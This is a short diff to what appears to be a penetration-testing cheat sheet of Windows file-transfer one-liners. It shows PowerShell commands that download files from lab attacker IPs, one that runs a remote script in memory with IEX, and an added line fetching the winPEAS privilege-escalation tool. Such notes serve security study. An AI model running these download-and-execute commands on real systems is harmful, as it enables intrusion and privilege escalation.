@@ -84,6 +84,8 @@ powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/
 #Powershell
 #One-liner Executing a remote PowerShell script directly from memory
 powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
+Invoke-WebRequest -Uri "http://192.168.49.52/winPEASany.exe" -OutFile "winpeas.exe"
+
 
 #Powershell
 #Windows Downloads with exe2hex and PowerShell
